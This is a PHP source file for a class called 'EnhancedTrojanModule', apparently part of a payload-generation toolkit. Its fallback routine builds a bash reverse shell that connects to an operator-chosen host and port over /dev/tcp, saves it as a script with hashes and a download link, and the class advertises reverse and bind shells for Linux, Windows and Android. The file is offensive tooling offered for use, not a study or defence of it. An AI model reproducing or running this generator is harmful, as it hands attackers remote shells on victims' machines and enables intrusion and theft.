<?php
/**
 * COSMIC OSINT LAB - Enhanced Trojan Module v2.1
 * Legacy module with performance caching and full compatibility.
 */
class EnhancedTrojanModule {
    
    private static $payloadCache = [];   // Performance cache (per‑request)
    private $config;
    
    public function __construct($config = []) {
        $this->config = array_merge([
            'encryption_key' => 'COSMIC_OSINT_2026',
            'payload_dir' => dirname(__DIR__, 2) . '/data/payloads/',
            'log_dir' => dirname(__DIR__, 2) . '/data/logs/'
        ], $config);
        $this->ensure_directories();
    }
    
    private function ensure_directories() {
        $dirs = [$this->config['payload_dir'], $this->config['log_dir']];
        foreach ($dirs as $dir) {
            if (!is_dir($dir)) mkdir($dir, 0755, true);
        }
    }
    
    public function generate_advanced_payload($config) {
        // Cache check – massive speed improvement
        $cacheKey = md5(serialize($config));
        if (isset(self::$payloadCache[$cacheKey])) {
            return self::$payloadCache[$cacheKey];
        }
        
        // Forward to AdvancedPayloadModule if available (better generation)
        if (class_exists('AdvancedPayloadModule')) {
            $adv = new AdvancedPayloadModule($this->config);
            $result = $adv->generate_payload($config);
            self::$payloadCache[$cacheKey] = $result;
            return $result;
        }
        
        // Fallback: basic reverse shell generation
        $type = $config['type'] ?? 'reverse_shell';
        $platform = $config['platform'] ?? 'linux';
        $lhost = $config['lhost'] ?? '127.0.0.1';
        $lport = $config['lport'] ?? 4444;
        
        $payload = "#!/bin/bash\nbash -i >& /dev/tcp/$lhost/$lport 0>&1";
        $filename = "cosmic_{$type}_{$platform}_" . date('Ymd_His') . ".sh";
        $path = $this->config['payload_dir'] . $filename;
        file_put_contents($path, $payload);
        
        $hashes = [
            'md5' => md5($payload),
            'sha1' => sha1($payload),
            'sha256' => hash('sha256', $payload)
        ];
        
        $result = [
            'payload' => $payload,
            'filename' => $filename,
            'path' => $path,
            'size' => strlen($payload),
            'hash' => $hashes,
            'config' => $config,
            'download_url' => '/download.php?file=' . urlencode($filename)
        ];
        
        self::$payloadCache[$cacheKey] = $result;
        return $result;
    }
    
    public function get_payload_types() {
        return [
            'reverse_shell' => [
                'name' => 'Reverse Shell',
                'platforms' => ['linux', 'windows', 'android'],
                'description' => 'Classic TCP reverse shell'
            ],
            'bind_shell' => [
                'name' => 'Bind Shell',
                'platforms' => ['linux', 'windows'],
                'description' => 'Listener on target'
            ]
        ];
    }
    
    public function get_encryption_methods() {
        return [
            'none' => 'No encryption',
            'base64' => 'Base64'
        ];
    }
    
    public function get_output_formats() {
        return [
            'sh' => 'Shell Script',
            'ps1' => 'PowerShell',
            'py' => 'Python'
        ];
    }
    
    public function analyze_payload($payload, $config = []) {
        return [
            'basic' => [
                'size' => strlen($payload),
                'entropy' => $this->calculate_entropy($payload)
            ]
        ];
    }
    
    private function calculate_entropy($s) {
        $len = strlen($s);
        if ($len === 0) return 0;
        $freq = [];
        for ($i=0; $i<$len; $i++) {
            $c = $s[$i];
            $freq[$c] = isset($freq[$c]) ? $freq[$c] + 1 : 1;
        }
        $entropy = 0;
        foreach ($freq as $count) {
            $p = $count / $len;
            $entropy -= $p * log($p, 2);
        }
        return round($entropy, 2);
    }
}
